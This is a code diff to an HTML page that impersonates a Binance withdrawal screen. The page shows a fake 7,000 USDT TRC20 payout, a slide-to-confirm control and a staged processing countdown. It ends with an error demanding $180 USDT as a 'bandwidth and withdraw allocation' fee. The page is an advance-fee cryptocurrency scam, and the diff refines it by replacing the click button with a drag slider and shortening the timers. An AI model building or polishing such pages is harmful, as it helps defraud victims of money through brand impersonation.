@@ -43,15 +43,41 @@
       margin-bottom: 30px;
       color: #ccc;
     }
-    .swipe {
+    .slider-container {
       background-color: #ffffff;
-      color: #0b0f1a;
-      padding: 14px;
       border-radius: 50px;
-      text-align: center;
-      font-weight: bold;
-      cursor: pointer;
+      position: relative;
+      height: 50px;
+      width: 100%;
       margin-bottom: 30px;
+      overflow: hidden;
+    }
+    .slider-track {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #0b0f1a;
+      font-weight: bold;
+      z-index: 1;
+    }
+    .slider-thumb {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 50px;
+      background-color: #f3ba2f;
+      border-radius: 50px;
+      cursor: pointer;
+      z-index: 2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     .section {
       display: none;
@@ -123,8 +149,14 @@
     <div class="logo">BINANCE</div>
     <div class="amount">7,000 USDT</div>
     <div class="network">Network: TRC20</div>
-    <div class="swipe" onclick="showPreview()">→ Swipe to confirm</div>
 
+    <!-- Slide to confirm -->
+    <div class="slider-container" id="slider">
+      <div class="slider-track">Slide to confirm</div>
+      <div class="slider-thumb" id="thumb">→</div>
+    </div>
+
+    <!-- Preview -->
     <div class="section" id="preview">
       <h3>Transaction Preview</h3>
       <div class="label">Receiving Address</div>
@@ -132,15 +164,18 @@
       <button class="button" onclick="startProcessing()">PROCESS WITHDRAWAL</button>
     </div>
 
+    <!-- Processing -->
     <div class="section" id="processing">
       <p>Please hold on while your payment is being credited to your account...</p>
-      <p id="timer">Loading: 4:00</p>
+      <p id="timer">Loading: 0:40</p>
     </div>
 
+    <!-- Received -->
     <div class="section" id="received">
       <button class="button" id="receivedBtn" disabled>I HAVE RECEIVED</button>
     </div>
 
+    <!-- Error -->
     <div class="section" id="error">
       <div class="error">⚠️ WITHDRAWAL ERROR: INSUFFICIENT BANDWIDTH</div>
       <p class="value">$180 USDT IS REQUIRED FOR BANDWIDTH AND WITHDRAW ALLOCATION CODE</p>
@@ -152,22 +187,35 @@
   </div>
 
   <script>
-    function showPreview() {
-      document.getElementById('preview').style.display = 'block';
-    }
+    const thumb = document.getElementById('thumb');
+    const slider = document.getElementById('slider');
+    let isDragging = false;
+
+    thumb.addEventListener('mousedown', () => isDragging = true);
+    document.addEventListener('mouseup', () => isDragging = false);
+    document.addEventListener('mousemove', (e) => {
+      if (!isDragging) return;
+      const rect = slider.getBoundingClientRect();
+      let x = e.clientX - rect.left;
+      x = Math.max(0, Math.min(x, rect.width - thumb.offsetWidth));
+      thumb.style.left = x + 'px';
+      if (x >= rect.width - thumb.offsetWidth - 5) {
+        slider.style.display = 'none';
+        document.getElementById('preview').style.display = 'block';
+      }
+    });
 
     function startProcessing() {
       document.getElementById('preview').style.display = 'none';
       document.getElementById('processing').style.display = 'block';
 
-      let time = 240;
+      let time = 40;
       const timerEl = document.getElementById('timer');
       const interval = setInterval(() => {
-        let minutes = Math.floor(time / 60);
-        let seconds = time % 60;
-        timerEl.textContent = `Loading: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        let seconds = time;
+        timerEl.textContent = `Loading: 0:${seconds < 10 ? '0' : ''}${seconds}`;
         time--;
-        if (time === 0) {
+        if (time < 0) {
           clearInterval(interval);
           document.getElementById('processing').style.display = 'none';
           document.getElementById('received').style.display = 'block';
@@ -177,7 +225,7 @@
     }
 
     function enableReceivedButton() {
-      let countdown = 60;
+      let countdown = 10;
       const btn = document.getElementById('receivedBtn');
       const interval = setInterval(() => {
         countdown--;
